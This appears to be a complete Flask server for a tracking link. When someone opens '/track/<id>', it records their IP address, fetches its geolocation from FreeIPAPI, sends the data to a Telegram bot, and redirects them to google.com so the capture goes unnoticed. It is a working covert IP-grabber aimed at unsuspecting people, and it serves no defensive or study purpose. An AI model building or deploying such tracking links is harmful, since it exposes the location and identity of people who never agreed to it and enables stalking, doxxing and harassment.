from flask import Flask, request, redirect
import requests
from bot import handle_tracking_data
import asyncio
import os
from telegram import Bot
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.bot = Bot(token=os.getenv('BOT_TOKEN'))

@app.route('/track/<tracking_id>')
def track(tracking_id):
    # Get IP address
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Get IP information from FreeIPAPI
    response = requests.get(f'https://freeipapi.com/api/json/{ip}')
    ip_data = response.json()
    
    # Handle the tracking data
    asyncio.run(handle_tracking_data(tracking_id, ip_data, app.bot))
    
    # Redirect to a safe page
    return redirect("https://google.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000))) 